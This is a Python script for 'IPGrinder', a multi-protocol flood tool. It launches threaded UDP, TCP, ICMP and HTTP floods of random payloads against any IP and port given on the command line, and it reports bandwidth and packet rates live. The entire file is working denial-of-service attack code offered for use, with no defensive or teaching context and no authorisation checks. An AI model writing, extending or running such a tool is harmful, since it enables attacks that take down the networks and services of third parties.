#!/usr/bin/env python3

import sys
import socket
import threading
import random
import time
import requests
import struct
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone

VERSION = "1.0.1"
CURRENT_USER = "NeoMatrix14241"
stop_event = threading.Event()

class BandwidthTracker:
    def __init__(self):
        self.bytes_sent = 0
        self.packets_sent = 0
        self.lock = threading.Lock()
    
    def add_bytes(self, n):
        with self.lock:
            self.bytes_sent += n
            self.packets_sent += 1
    
    def get_formatted_bandwidth(self):
        with self.lock:
            bytes_per_sec = self.bytes_sent / (time.time() - self.start_time)
            packets_per_sec = self.packets_sent / (time.time() - self.start_time)
            
            units = ['B/s', 'KB/s', 'MB/s', 'GB/s', 'TB/s']
            unit_index = 0
            
            while bytes_per_sec >= 1024 and unit_index < len(units) - 1:
                bytes_per_sec /= 1024
                unit_index += 1
                
            return f"{bytes_per_sec:.2f} {units[unit_index]} ({packets_per_sec:.0f} pps)"
    
    def get_formatted_total(self):
        with self.lock:
            total_bytes = self.bytes_sent
            units = ['B', 'KB', 'MB', 'GB', 'TB']
            unit_index = 0
            
            while total_bytes >= 1024 and unit_index < len(units) - 1:
                total_bytes /= 1024
                unit_index += 1
                
            return f"{total_bytes:.2f} {units[unit_index]} ({self.packets_sent:,} packets)"
    
    def start(self):
        self.start_time = time.time()

bandwidth_tracker = BandwidthTracker()

def get_utc_time():
    return datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')

def usage():
    print(f"Usage: python {sys.argv[0]} <IP> <PORT> [PROTOCOLS] [THREADS_PER_PROTO] [PACKET_SIZE]")
    print("Available protocols: udp,tcp,icmp,http,all")
    print("Example: python ipgrinder.py 192.168.1.1 80 tcp,udp 100 1024")
    sys.exit(1)

def check_root():
    if hasattr(os, 'geteuid'):
        return os.geteuid() == 0
    else:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

def get_available_protocols():
    return ['udp', 'tcp', 'http', 'icmp']

if len(sys.argv) < 3:
    usage()

ip = sys.argv[1]
try:
    port = int(sys.argv[2])
except ValueError:
    usage()

requested_protocols = sys.argv[3].lower().split(',') if len(sys.argv) > 3 else ['all']
if 'all' in requested_protocols:
    protocols = get_available_protocols()
else:
    available = get_available_protocols()
    protocols = [p for p in requested_protocols if p in available]
    if not protocols:
        print("❌ No valid protocols available for your environment!")
        sys.exit(1)

threads_per_proto = int(sys.argv[4]) if len(sys.argv) > 4 else 50
packet_size = int(sys.argv[5]) if len(sys.argv) > 5 else 1024

payload = random._urandom(packet_size)

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, port))
            bandwidth_tracker.add_bytes(len(payload))
        except:
            continue
    sock.close()

def tcp_flood():
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(payload)
            bandwidth_tracker.add_bytes(len(payload))
            sock.close()
        except:
            continue

def icmp_flood():
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            icmp_type = 8
            icmp_code = 0
            checksum = 0
            icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, os.getpid() & 0xFFFF, 1)
            
            packet = icmp_header + payload
            sock.sendto(packet, (ip, 0))
            bandwidth_tracker.add_bytes(len(packet))
            sock.close()
        except:
            continue

def http_flood():
    while not stop_event.is_set():
        try:
            response = requests.get(f"http://{ip}:{port}", timeout=1, data=payload)
            bandwidth_tracker.add_bytes(len(payload))
        except:
            continue

def start_flood(protocol):
    flood_funcs = {
        'udp': udp_flood,
        'tcp': tcp_flood,
        'icmp': icmp_flood,
        'http': http_flood
    }
    
    if protocol not in flood_funcs:
        print(f"❌ Invalid protocol: {protocol}")
        return
        
    threads = []
    try:
        for i in range(threads_per_proto):
            thread = threading.Thread(target=flood_funcs[protocol], daemon=True)
            threads.append(thread)
            thread.start()
            if i > 0 and i % 1000 == 0:
                print(f"  └─ Started {i}/{threads_per_proto} threads for {protocol.upper()}")
    except Exception as e:
        print(f"❌ Error in {protocol.upper()} flood: {str(e)}")
    return threads

if 'icmp' in protocols and not check_root():
    print("⚠️ Warning: ICMP flood requires root/administrator privileges!")
    if 'icmp' in protocols:
        protocols.remove('icmp')

print(f"""
╔══════════════════════════════════════════╗
║             🌩️  IPGrinder v{VERSION}            ║
║        Multi-Protocol Flood Tool         ║
╚══════════════════════════════════════════╝

📅 Start Time (UTC): {get_utc_time()}
👤 User: {CURRENT_USER}
""")

print(f"🎯 Target: {ip}:{port}")
print(f"📦 Active protocols: {', '.join(protocols)}")
print(f"🧵 Threads per protocol: {threads_per_proto}")
print(f"📏 Packet Size: {packet_size} bytes")

print("\n🚀 Initializing flood attacks...")
all_threads = []
attack_start_time = time.time()
bandwidth_tracker.start()

for protocol in protocols:
    try:
        print(f"\n⚡ Starting {protocol.upper()} flood...")
        protocol_threads = start_flood(protocol)
        if protocol_threads:
            all_threads.extend(protocol_threads)
            print(f"✅ {protocol.upper()} flood successfully initiated with {len(protocol_threads)} threads")
    except Exception as e:
        print(f"❌ Failed to start {protocol.upper()} flood: {str(e)}")

if not all_threads:
    print("\n❌ No protocols were successfully started!")
    sys.exit(1)

total_threads = len(all_threads)
print(f"\n🎯 All requested flood attacks are running with {total_threads} total threads")
print("Press Ctrl+C to stop the attack")

try:
    while not stop_event.is_set():
        current_time = time.time()
        elapsed_time = int(current_time - attack_start_time)
        hours = elapsed_time // 3600
        minutes = (elapsed_time % 3600) // 60
        seconds = elapsed_time % 60
        
        bandwidth_rate = bandwidth_tracker.get_formatted_bandwidth()
        total_sent = bandwidth_tracker.get_formatted_total()
        
        status = f"\r⏱️ Runtime: {hours:02d}:{minutes:02d}:{seconds:02d} | "
        status += f"Speed: {bandwidth_rate} | "
        status += f"Total: {total_sent}"
        
        print(status, end="")
        time.sleep(0.1)

except KeyboardInterrupt:
    stop_time = get_utc_time()
    print("\n\n⏳ Stopping all attacks gracefully...")
    stop_event.set()
    
    cleanup_timeout = 3
    cleanup_start = time.time()
    while time.time() - cleanup_start < cleanup_timeout:
        active_threads = sum(1 for thread in threading.enumerate() if thread.is_alive())
        if active_threads <= 1:
            break
        print(f"\r⏳ Waiting for threads to stop... ({active_threads} remaining)", end="")
        time.sleep(0.1)
    
    total_time = time.time() - attack_start_time
    hours = int(total_time // 3600)
    minutes = int((total_time % 3600) // 60)
    seconds = int(total_time % 60)
    
    final_bandwidth = bandwidth_tracker.get_formatted_bandwidth()
    total_sent = bandwidth_tracker.get_formatted_total()
    
    print(f"""
✅ Attack stopped successfully.
📊 Attack Summary:
   Start time: {get_utc_time()}
   End time: {stop_time}
   Duration: {hours:02d}:{minutes:02d}:{seconds:02d}
   Total threads: {total_threads}
   Protocols used: {', '.join(protocols)}
   Final speed: {final_bandwidth}
   Total sent: {total_sent}
""")
    sys.exit(0)